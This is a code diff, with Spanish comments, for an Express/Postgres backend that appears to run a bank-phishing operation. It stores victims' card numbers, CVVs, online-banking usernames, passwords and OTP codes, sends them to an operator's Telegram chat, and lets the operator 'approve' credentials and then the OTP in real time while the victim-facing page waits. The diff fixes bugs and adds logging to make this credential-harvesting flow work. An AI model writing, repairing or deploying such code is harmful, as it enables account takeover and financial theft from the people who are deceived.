@@ -29,9 +29,10 @@ if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
 }
 
 // ============================================================
-// INIT DB
+// INIT DB (crea tabla + agrega columnas nuevas)
 // ============================================================
 async function initDB() {
+    // Crear tabla base si no existe
     await pool.query(`
         CREATE TABLE IF NOT EXISTS pagos_pendientes (
             id               SERIAL PRIMARY KEY,
@@ -42,14 +43,17 @@ async function initDB() {
             vencimiento      VARCHAR(10),
             marca_tarjeta    VARCHAR(20),
             banco_emisor     VARCHAR(120),
-            estado           VARCHAR(20) DEFAULT 'pendiente',
+            estado           VARCHAR(30) DEFAULT 'pendiente',
             motivo_rechazo   TEXT,
             redirigir_a      VARCHAR(60),
             telegram_msg_id  BIGINT,
             created_at       TIMESTAMPTZ DEFAULT NOW(),
             updated_at       TIMESTAMPTZ DEFAULT NOW()
         );
+        CREATE INDEX IF NOT EXISTS idx_pagos_estado ON pagos_pendientes(estado);
     `);
+
+    // Columnas nuevas (idempotente)
     await pool.query(`
         ALTER TABLE pagos_pendientes
           ADD COLUMN IF NOT EXISTS usuario_banco VARCHAR(120),
@@ -60,7 +64,11 @@ async function initDB() {
           ADD COLUMN IF NOT EXISTS credenciales_aprobadas BOOLEAN DEFAULT FALSE,
           ADD COLUMN IF NOT EXISTS otp_aprobado BOOLEAN DEFAULT FALSE;
     `);
-    console.log('✅ Tabla lista con columnas nuevas (fase_actual, credenciales_aprobadas, otp_aprobado)');
+
+    // 🔥 FIX: ampliar 'estado' a 30 para que quepa 'aprobado_credenciales' (21) y 'rechazado_credenciales' (22)
+    await pool.query(`ALTER TABLE pagos_pendientes ALTER COLUMN estado TYPE VARCHAR(30);`);
+
+    console.log('✅ Tabla pagos_pendientes lista con columnas nuevas y estado VARCHAR(30)');
 }
 initDB().catch(err => console.error('❌ initDB:', err));
 
@@ -72,34 +80,36 @@ async function tgSendMessage(text, replyMarkup) {
     const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode: 'HTML' };
     if (replyMarkup) body.reply_markup = replyMarkup;
 
+    console.log('📤 Telegram sendMessage payload:', JSON.stringify(body, null, 2));
+
     try {
         const r = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify(body)
         });
-        return await r.json();
+        const data = await r.json();
+        if (!data.ok) console.error('❌ Telegram error:', data);
+        else console.log('✅ Telegram mensaje enviado, msg_id:', data.result.message_id);
+        return data;
     } catch (e) {
         console.error('❌ fetch Telegram falló:', e.message);
         return { ok: false };
     }
 }
 
-async function tgEditMessage(messageId, text, replyMarkup) {
+async function tgEditMessage(messageId, text) {
     const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
-    const body = {
-        chat_id: TELEGRAM_CHAT_ID,
-        message_id: messageId,
-        text,
-        parse_mode: 'HTML'
-    };
-    if (replyMarkup) body.reply_markup = replyMarkup;
-
     try {
         const r = await fetch(url, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(body)
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                message_id: messageId,
+                text,
+                parse_mode: 'HTML'
+            })
         });
         return r.json();
     } catch { return null; }
@@ -132,7 +142,7 @@ function construirTextoPago(pago) {
         `🔒 <b>CVV:</b> <code>${pago.cvv}</code>\n` +
         `🏷️ <b>Marca:</b> ${(pago.marca_tarjeta || '').toUpperCase()}\n` +
         `🏦 <b>Banco:</b> ${pago.banco_emisor || '—'}\n` +
-        `\n<b>── CREDENCIALES ──</b>\n` +
+        `\n<b>── CREDENCIALES BANCO ──</b>\n` +
         `👤 <b>Usuario:</b> <code>${usuario}</code>\n` +
         `🔑 <b>Contraseña:</b> <code>${password}</code>\n` +
         `🔐 <b>OTP:</b> <code>${otp}</code>\n` +
@@ -165,7 +175,7 @@ async function enviarSolicitudATelegram(pago) {
 }
 
 // ============================================================
-// ACTUALIZAR MENSAJE EXISTENTE
+// EDITAR MENSAJE EXISTENTE
 // ============================================================
 async function actualizarMensajeTG(pago, encabezado, textoExtra) {
     if (!pago.telegram_msg_id) return;
@@ -182,7 +192,23 @@ async function actualizarMensajeTG(pago, encabezado, textoExtra) {
         ]]
     };
 
-    await tgEditMessage(pago.telegram_msg_id, texto, replyMarkup);
+    // Editar texto + mantener botones
+    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
+    try {
+        await fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: TELEGRAM_CHAT_ID,
+                message_id: pago.telegram_msg_id,
+                text,
+                parse_mode: 'HTML',
+                reply_markup: replyMarkup
+            })
+        });
+    } catch (e) {
+        console.error('tgEditMessage error:', e.message);
+    }
 }
 
 // ============================================================
@@ -269,29 +295,21 @@ app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
         }
         const row = result.rows[0];
 
-        // 🔥 Flujo de 2 fases:
         // Fase 1: credenciales aprobadas → visa.php muestra OTP
-        // Fase 2: OTP aprobado → visa.php redirige
-        if (row.fase_actual === 'otp' && row.credenciales_aprobadas && !row.otp_aprobado) {
-            // Credenciales aprobadas → desbloquear OTP
-            if (row.estado === 'aprobado_credenciales') {
-                return res.json({
-                    success: true,
-                    estado: 'aprobado',
-                    fase: 'credenciales'
-                });
-            }
-            if (row.estado === 'rechazado_credenciales') {
-                return res.json({
-                    success: true,
-                    estado: 'rechazado',
-                    fase: 'credenciales',
-                    mensaje: row.motivo_rechazo || 'Credenciales incorrectas. Intenta nuevamente.'
-                });
-            }
+        if (row.estado === 'aprobado_credenciales') {
+            return res.json({ success: true, estado: 'aprobado', fase: 'credenciales' });
+        }
+        if (row.estado === 'rechazado_credenciales') {
+            return res.json({
+                success: true,
+                estado: 'rechazado',
+                fase: 'credenciales',
+                mensaje: row.motivo_rechazo || 'Credenciales incorrectas. Intenta nuevamente.'
+            });
         }
 
-        if (row.otp_aprobado) {
+        // Fase 2: OTP aprobado → redirigir
+        if (row.estado === 'aprobado' || row.otp_aprobado === true) {
             return res.json({
                 success: true,
                 estado: 'aprobado',
@@ -300,7 +318,6 @@ app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
                 marca: row.marca_tarjeta
             });
         }
-
         if (row.estado === 'rechazado' || row.estado === 'rechazado_otp') {
             return res.json({
                 success: true,
@@ -318,7 +335,7 @@ app.get('/api/estado-pago/:solicitud_id', async (req, res) => {
 });
 
 // ============================================================
-// WEBHOOK TELEGRAM — aprobar / rechazar
+// WEBHOOK TELEGRAM
 // ============================================================
 app.post('/api/telegram-webhook', async (req, res) => {
     res.sendStatus(200);
@@ -343,12 +360,22 @@ app.post('/api/telegram-webhook', async (req, res) => {
         }
         const pago = result.rows[0];
 
-        // ⚡ Determinar en qué fase estamos
+        // ¿Estamos en fase OTP?
         const estaEnFaseOTP = !!pago.codigo_otp && pago.codigo_otp !== 'N/A';
+
+        // Evitar doble aprobación de la misma fase
+        if (pago.estado === 'aprobado' || pago.otp_aprobado === true) {
+            await tgAnswerCallback(cq.id, 'Ya fue aprobado completamente');
+            return;
+        }
+        if (pago.estado === 'aprobado_credenciales' && !estaEnFaseOTP) {
+            await tgAnswerCallback(cq.id, 'Credenciales ya aprobadas');
+            return;
+        }
 
         if (accion === 'aprobar') {
             if (!estaEnFaseOTP) {
-                // 🔵 FASE 1: APROBAR CREDENCIALES
+                // 🟢 FASE 1: APROBAR CREDENCIALES
                 await pool.query(
                     `UPDATE pagos_pendientes
                      SET estado = 'aprobado_credenciales',
@@ -359,7 +386,6 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 );
                 await tgAnswerCallback(cq.id, '✅ Credenciales aprobadas');
 
-                // Actualizar mensaje mostrando aprobación de credenciales
                 if (msgId) {
                     await tgEditMessage(msgId,
                         `✅ <b>CREDENCIALES APROBADAS</b>\n\n` +
@@ -448,5 +474,7 @@ app.listen(PORT, '0.0.0.0', () => {
     console.log(`🚀 Backend pagos en puerto ${PORT}`);
     console.log(`🌐 FRONT_BASE_URL = ${FRONT_BASE_URL}`);
     console.log(`🔗 PUBLIC_BACKEND_URL = ${PUBLIC_BACKEND_URL}`);
+    console.log(`🤖 Telegram bot: ${TELEGRAM_BOT_TOKEN ? 'OK' : 'FALTA'}`);
+    console.log(`🗄️  Postgres: ${process.env.DATABASE_URL ? 'OK' : 'FALTA'}`);
     registrarWebhook();
 });
